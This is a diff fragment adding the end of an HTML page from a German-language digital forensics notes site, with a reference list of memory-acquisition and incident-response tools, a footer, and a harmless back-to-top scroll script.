+  <li><a href="https://github.com/Velocidex/velociraptor">Velociraptor DFIR Framework (GitHub)</a></li>
+  <li><a href="https://github.com/504ensicsLabs/LiME">LiME — Linux Memory Extractor (GitHub)</a></li>
+  <li><a href="https://github.com/microsoft/avml">Microsoft avml (GitHub)</a></li>
+  <li>NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response</li>
+</ul>
+
 </article></main>
+<nav class="prev-next" id="prevNextNav"></nav>
+<footer class="page-footer">
+  <a href="https://github.com/NicCsn/digital-forensics-notes">GitHub</a> &middot; <a href="../00-meta/glossary.html">Glossar</a> &middot; <a href="../INDEX.html">Index</a>
+</footer>
+</div>
+<button id="back-to-top" title="Nach oben">↑</button>
+<script src="../nav-order.js"></script>
+<script src="../search.js"></script>
+<script>
+(function(){
+  var btn = document.getElementById('back-to-top');
+  if (!btn) return;
+  window.addEventListener('scroll', function() {
+    btn.classList.toggle('show', window.scrollY > 400);
+  });
+  btn.addEventListener('click', function() {
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  });
+})();
+</script>
 </body>
 </html>
